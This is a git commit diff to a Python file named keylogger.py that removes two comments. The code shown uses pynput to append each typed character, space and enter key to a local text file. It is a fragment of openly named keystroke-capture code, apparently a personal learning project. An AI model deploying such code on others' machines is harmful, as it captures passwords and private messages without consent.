62544504c9beb5511b0858756f75f5ffd8dfdff5
shoaib inamdar <shoaibinamdar14@gmail.com>
2024-08-15 13:43:27 +0530

    updated

--- keylogger.py
+++ keylogger.py
@@ -3,12 +3,10 @@ from pynput import keyboard
 def keypressed(key):
     with open("keyfile.txt", "a") as f:
         try:
-            # Check if the key is a character
             char = key.char
             if char is not None:
                 f.write(char)
         except AttributeError:
-            # Handle special keys like space, enter, etc.
             if key == keyboard.Key.space:
                 f.write(" ")
             elif key == keyboard.Key.enter:
